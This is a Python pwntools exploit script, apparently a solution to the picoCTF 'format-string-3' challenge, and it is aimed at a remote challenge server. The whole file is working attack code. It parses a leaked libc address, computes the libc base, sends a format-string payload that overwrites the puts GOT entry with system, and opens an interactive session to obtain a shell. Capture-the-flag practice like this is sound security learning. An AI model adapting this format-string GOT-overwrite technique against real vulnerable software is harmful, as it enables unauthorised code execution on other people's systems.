#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./format-string-3_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc rhea.picoctf.net 62041"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}


def exec_fmt(payload):
    with context.quiet:
        io = start()

    io.clean()
    io.sendline(payload)
    resp = io.recvline()

    with context.quiet:
        io.close()
    return resp


# fs = FmtStr(execute_fmt=exec_fmt)
offset = 38

io = start()

io.recvuntil(b"libc: ")
libc_setvbuf = int(io.recvline(), 16)
libc.address = libc_setvbuf - libc.sym["setvbuf"]
log.info(f"{libc.address=:#x}")
assert (libc.address & 0xfff == 0)

payload = fmtstr_payload(offset,
                         {elf.got['puts']: libc.sym['system']},
                         write_size="byte")

io.sendline(payload)
io.clean()

io.interactive()
